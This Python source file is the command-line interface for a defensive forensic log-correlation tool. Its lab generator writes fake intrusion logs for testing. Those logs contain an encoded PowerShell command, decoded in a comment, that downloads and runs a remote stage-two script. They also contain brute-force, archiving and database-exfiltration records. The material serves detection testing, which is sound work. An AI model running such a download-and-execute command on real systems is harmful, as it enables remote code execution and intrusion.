# File: lss_cli.py
# Project: Log Story Studio (LSS) - Production Forensic Engine
# Python Version: 3.13 (Standard Library Only)

import argparse
import json
import sys
from pathlib import Path
from typing import List

from core.database import ForensicDatabase
from core.normalizer import CanonicalNormalizer
from core.correlator import DeterministicCorrelator
from core.lateral_movement import LateralMovementDetector
from core.storyteller import ForensicStoryteller
from core.html_studio import HTMLForensicWorkbench


def cmd_ingest(args: argparse.Namespace) -> None:
    db = ForensicDatabase(args.db)
    normalizer = CanonicalNormalizer(db, batch_size=args.batch_size)
    target = Path(args.path).resolve()

    if not target.exists():
        print(f"[!] Error: Target path does not exist: {target}", file=sys.stderr)
        sys.exit(1)

    files: List[Path] = (
        [target]
        if target.is_file()
        else sorted([p for p in target.rglob("*") if p.is_file() and not p.name.startswith(".")])
    )

    total_in, total_dup, total_err = 0, 0, 0
    print(f"[*] Starting forensic ingestion across {len(files)} file(s) into vault: {db.db_path.name}")

    for fpath in files:
        ingested, dup, err = normalizer.ingest_file(
            str(fpath),
            c_binary_path=args.c_binary,
            filter_token=args.filter_token,
            default_host=args.default_host
        )
        total_in += ingested
        total_dup += dup
        total_err += err
        print(
            f"    [+] {fpath.name:<32} | Ingested: {ingested:<6} | Duplicates: {dup:<5} | Unparsed: {err}"
        )

    print(
        f"\n[=] Ingestion Complete -> Total Canonical Events Added: {total_in} | "
        f"Duplicates Skipped: {total_dup} | Unparsed Lines: {total_err}"
    )


def cmd_analyze(args: argparse.Namespace) -> None:
    db = ForensicDatabase(args.db)
    correlator = DeterministicCorrelator(db)
    lateral_detector = LateralMovementDetector(db)

    out_dir = Path(args.output_dir).resolve()
    out_dir.mkdir(parents=True, exist_ok=True)

    hosts = [args.host.upper()] if args.host else correlator.get_distinct_hosts()
    if not hosts:
        print("[!] No hosts found in the forensic database. Run 'ingest' first.")
        return

    db.clear_Derived_analysis_tables(args.host.upper() if args.host else None)
    all_pivots = lateral_detector.prove_cross_host_pivots(args.host.upper() if args.host else None)

    print(f"[*] Running Deterministic Correlation Engine across {len(hosts)} isolated host topology(ies)...")

    for host in hosts:
        print(f"\n--- Host Topology: {host} ---")
        findings = correlator.detect_extended_attack_chains(host)
        deviations = correlator.analyze_baseline_deviations(host)
        host_pivots = [p for p in all_pivots if host in (p["source_host"], p["target_host"])]

        process_trees = {}
        for f in findings:
            r_pid = f.get("root_pid")
            if r_pid is not None and r_pid not in process_trees:
                tree = correlator.reconstruct_process_tree(host, int(r_pid))
                if tree:
                    process_trees[int(r_pid)] = tree

        # 1. Generate Markdown Report
        md_report = ForensicStoryteller.generate_markdown_report(
            host, findings, process_trees, deviations, host_pivots
        )
        md_path = out_dir / f"Forensic_Report_{host}.md"
        md_path.write_text(md_report, encoding="utf-8")
        print(f"    [+] Markdown Case Report  : {md_path}")

        # 2. Generate Interactive Offline HTML Workbench
        html_workbench = HTMLForensicWorkbench.generate_interactive_html(
            host, findings, process_trees, deviations, host_pivots
        )
        html_path = out_dir / f"Workbench_{host}.html"
        html_path.write_text(html_workbench, encoding="utf-8")
        print(f"    [+] Interactive HTML GUI  : {html_path}")

        # 3. Generate Native Draw.io XML Diagrams per chain
        for idx, f in enumerate(findings, start=1):
            xml_diagram = ForensicStoryteller.generate_drawio_xml(f)
            safe_logon = "".join(c if c.isalnum() else "_" for c in str(f["logon_id"]))
            xml_path = out_dir / f"AttackChain_{host}_{safe_logon}_{idx}.drawio"
            xml_path.write_text(xml_diagram, encoding="utf-8")
            print(f"    [+] Draw.io XML Diagram   : {xml_path}")


def cmd_verify(args: argparse.Namespace) -> None:
    db = ForensicDatabase(args.db)
    matches = db.lookup_evidence_by_hash(args.hash_prefix)

    if not matches:
        print(f"[!] No raw evidence record found matching SHA-256 prefix: {args.hash_prefix}")
        sys.exit(1)

    for idx, row in enumerate(matches, start=1):
        print(f"\n================ CRYPTOGRAPHIC TRACEABILITY PROOF #{idx} ================")
        print(f"SHA-256 Hash      : {row['sha256_hash']}")
        print(f"Source File       : {row['source_file']}")
        print(f"Exact Line Number : {row['line_number']}")
        print(f"Exact Byte Offset : {row['byte_offset']}")
        print(f"Ingested At (UTC) : {row['ingested_at_utc']}")
        print(f"Host / Source Type: {row['host']} ({row['log_source_type']})")
        print(f"Event Category    : {row['event_category']} (Code: {row['event_code']}, Risk: {row['risk_score']}/100)")
        print(f"User / LogonId    : {row['user_name']} / {row['logon_id']}")
        if row.get("decoded_payload"):
            print(f"Decoded Payload   : {row['decoded_payload']}")
        print("Raw Record Payload:")
        print(row["raw_payload"])
        print("=========================================================================")


def cmd_status(args: argparse.Namespace) -> None:
    db = ForensicDatabase(args.db)
    stats = db.get_database_statistics()
    print(f"=== Log Story Studio Vault Status ({db.db_path.name}) ===")
    print(f"Total Sealed Evidence Records: {stats['total_evidence_records']}")
    if not stats["hosts"]:
        print("No hosts ingested yet.")
        return
    print("\nIsolated Host Topologies:")
    for h in stats["hosts"]:
        print(
            f"  - Host: {h['host']:<18} | Events: {h['event_count']:<6} | "
            f"Window: {h['first_seen']} -> {h['last_seen']}"
        )


def cmd_generate_lab(args: argparse.Namespace) -> None:
    """
    Generates a multi-file, multi-host, multi-format forensic evidence directory
    simulating a full intrusion (Brute Force -> Encoded PowerShell -> 7z Archiving ->
    Cross-Host Lateral Pivot to Linux DB Server -> Database Egress).
    """
    lab_dir = Path(args.lab_dir).resolve()
    lab_dir.mkdir(parents=True, exist_ok=True)

    # 1. Windows Sysmon & Security JSONL on WS-FINANCE-01
    # Base64 below decodes (UTF-16LE) to: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.244/stage2.ps1')
    encoded_ps = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIANAA0AC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA"

    win_events = [
        {"Event": {"System": {"EventID": 1, "TimeCreated": {"SystemTime": "2026-11-10T08:00:01.100Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"User": "NT AUTHORITY\\SYSTEM", "LogonId": "0x3e7", "ProcessGuid": "{A001}", "ProcessId": 620, "ParentProcessGuid": "{A000}", "ParentProcessId": 4, "Image": "C:\\Windows\\System32\\services.exe", "ParentImage": "System", "CommandLine": "C:\\Windows\\System32\\services.exe"}}},
        {"Event": {"System": {"EventID": 1, "TimeCreated": {"SystemTime": "2026-11-10T08:01:10.000Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"User": "CORP\\emp01", "LogonId": "0x11111", "ProcessGuid": "{B001}", "ProcessId": 1200, "ParentProcessGuid": "{A001}", "ParentProcessId": 620, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs"}}},
        {"Event": {"System": {"EventID": 1, "TimeCreated": {"SystemTime": "2026-11-10T08:02:15.000Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"User": "CORP\\emp01", "LogonId": "0x11111", "ProcessGuid": "{B002}", "ProcessId": 1250, "ParentProcessGuid": "{A001}", "ParentProcessId": 620, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k LocalService"}}},
        {"Event": {"System": {"EventID": 4625, "TimeCreated": {"SystemTime": "2026-11-10T09:14:50.120Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"TargetUserName": "admin_y", "TargetLogonId": "0x0", "IpAddress": "10.20.30.99"}}},
        {"Event": {"System": {"EventID": 4625, "TimeCreated": {"SystemTime": "2026-11-10T09:14:52.450Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"TargetUserName": "admin_y", "TargetLogonId": "0x0", "IpAddress": "10.20.30.99"}}},
        {"Event": {"System": {"EventID": 4625, "TimeCreated": {"SystemTime": "2026-11-10T09:14:55.890Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"TargetUserName": "admin_y", "TargetLogonId": "0x0", "IpAddress": "10.20.30.99"}}},
        {"Event": {"System": {"EventID": 4624, "TimeCreated": {"SystemTime": "2026-11-10T09:15:01.005Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"TargetUserName": "admin_y", "TargetLogonId": "0x99f8a", "IpAddress": "10.20.30.99"}}},
        {"Event": {"System": {"EventID": 1, "TimeCreated": {"SystemTime": "2026-11-10T09:15:12.300Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"User": "CORP\\admin_y", "LogonId": "0x99f8a", "ProcessGuid": "{C100}", "ProcessId": 4100, "ParentProcessGuid": "{C000}", "ParentProcessId": 880, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\winrshost.exe", "CommandLine": f"cmd.exe /c powershell.exe -NoP -W Hidden -enc {encoded_ps}"}}},
        {"Event": {"System": {"EventID": 1, "TimeCreated": {"SystemTime": "2026-11-10T09:15:15.110Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"User": "CORP\\admin_y", "LogonId": "0x99f8a", "ProcessGuid": "{C101}", "ProcessId": 4420, "ParentProcessGuid": "{C100}", "ParentProcessId": 4100, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": f"powershell.exe -NoP -W Hidden -enc {encoded_ps}"}}},
        {"Event": {"System": {"EventID": 1, "TimeCreated": {"SystemTime": "2026-11-10T09:15:40.500Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"User": "CORP\\admin_y", "LogonId": "0x99f8a", "ProcessGuid": "{C102}", "ProcessId": 4890, "ParentProcessGuid": "{C101}", "ParentProcessId": 4420, "Image": "C:\\Program Files\\7-Zip\\7z.exe", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "7z.exe a -pSecret123 C:\\Temp\\q4_payroll.7z C:\\Finance\\Payroll_2026.xlsx"}}},
        {"Event": {"System": {"EventID": 11, "TimeCreated": {"SystemTime": "2026-11-10T09:15:42.010Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"User": "CORP\\admin_y", "LogonId": "0x99f8a", "ProcessGuid": "{C102}", "ProcessId": 4890, "Image": "C:\\Program Files\\7-Zip\\7z.exe", "TargetFilename": "C:\\Temp\\q4_payroll.7z"}}},
        # Outbound lateral connection from WS-FINANCE-01 (192.168.10.55) to DB-CORE-LINUX (192.168.10.200)
        {"Event": {"System": {"EventID": 3, "TimeCreated": {"SystemTime": "2026-11-10T09:16:00.000Z"}, "Computer": "WS-FINANCE-01"}, "EventData": {"User": "CORP\\admin_y", "LogonId": "0x99f8a", "ProcessGuid": "{C101}", "ProcessId": 4420, "Image": "C:\\Windows\\System32\\OpenSSH\\ssh.exe", "SourceIp": "192.168.10.55", "DestinationIp": "DB-CORE-LINUX", "DestinationPort": 22}}}
    ]

    win_file = lab_dir / "01_ws_finance_sysmon.jsonl"
    with open(win_file, "w", encoding="utf-8") as f:
        for ev in win_events:
            f.write(json.dumps(ev) + "\n")

    # 2. Linux Auth/Syslog on DB-CORE-LINUX showing Lateral Movement Ingress + Command Execution
    linux_lines = [
        "Nov 10 09:15:58 db-core-linux sshd[9010]: Failed password for root from 192.168.10.55 port 51230 ssh2",
        "Nov 10 09:15:59 db-core-linux sshd[9010]: Failed password for root from 192.168.10.55 port 51230 ssh2",
        "Nov 10 09:16:02 db-core-linux sshd[9012]: Accepted password for root from 192.168.10.55 port 51234 ssh2",
        "Nov 10 09:16:10 db-core-linux sudo[9012]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/db_dump.tar.gz /var/lib/mysql"
    ]
    linux_file = lab_dir / "02_db_core_auth.log"
    linux_file.write_text("\n".join(linux_lines) + "\n", encoding="utf-8")

    # 3. CSV Database Egress Telemetry on DB-CORE-LINUX
    csv_lines = [
        "timestamp,host,src_ip,dst_ip,dst_port,user,logon_id,action,query,bytes_out",
        "2026-11-10T09:16:25.000Z,DB-CORE-LINUX,192.168.10.200,198.51.100.244,443,root,LINUX_SESS_9012,DB_EGRESS_EXFIL,SELECT * FROM customers_vault INTO OUTFILE '/tmp/db_dump.tar.gz',52428800"
    ]
    csv_file = lab_dir / "03_db_egress_audit.csv"
    csv_file.write_text("\n".join(csv_lines) + "\n", encoding="utf-8")

    print(f"[+] Multi-vector forensic lab evidence generated in: {lab_dir}")
    print("    1. 01_ws_finance_sysmon.jsonl (Windows Sysmon + Base64 PowerShell + 7z + Lateral SSH)")
    print("    2. 02_db_core_auth.log        (Linux SSH Brute Force + Lateral Ingress + Sudo Tar)")
    print("    3. 03_db_egress_audit.csv     (Database Audit CSV Egress Exfiltration)")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Log Story Studio (LSS) — Production DFIR & SOC Deterministic Narrative Platform"
    )
    parser.add_argument("--db", default="lss_investigation.db", help="Path to SQLite forensic vault")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # 1. ingest
    p_ingest = subparsers.add_parser("ingest", help="Ingest raw log files or directories into the Canonical Vault")
    p_ingest.add_argument("path", help="File or directory path containing raw logs")
    p_ingest.add_argument("--c-binary", default=None, help="Optional path to compiled raw_pre_indexer C binary")
    p_ingest.add_argument("--filter-token", default=None, help="Optional case-insensitive pre-filter string")
    p_ingest.add_argument("--default-host", default="WEB-SERVER-01", help="Default host name for hostless web logs")
    p_ingest.add_argument("--batch-size", type=int, default=2000, help="SQLite transaction batch size")
    p_ingest.set_defaults(func=cmd_ingest)

    # 2. analyze
    p_analyze = subparsers.add_parser("analyze", help="Correlate events and generate Markdown, Draw.io, and HTML reports")
    p_analyze.add_argument("--host", default=None, help="Analyze a specific host (default: all hosts)")
    p_analyze.add_argument("--output-dir", default="forensic_reports", help="Output directory for reports and diagrams")
    p_analyze.set_defaults(func=cmd_analyze)

    # 3. verify-hash
    p_verify = subparsers.add_parser("verify-hash", help="Retrieve raw record, line number, and byte offset by SHA-256")
    p_verify.add_argument("hash_prefix", help="Full or prefix of the SHA-256 evidence hash")
    p_verify.set_defaults(func=cmd_verify)

    # 4. status
    p_status = subparsers.add_parser("status", help="Show forensic database statistics and isolated host topologies")
    p_status.set_defaults(func=cmd_status)

    # 5. generate-lab
    p_lab = subparsers.add_parser("generate-lab", help="Generate realistic multi-host, multi-format forensic test lab")
    p_lab.add_argument("--lab-dir", default="sample_forensic_lab", help="Directory to write sample evidence files")
    p_lab.set_defaults(func=cmd_generate_lab)

    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
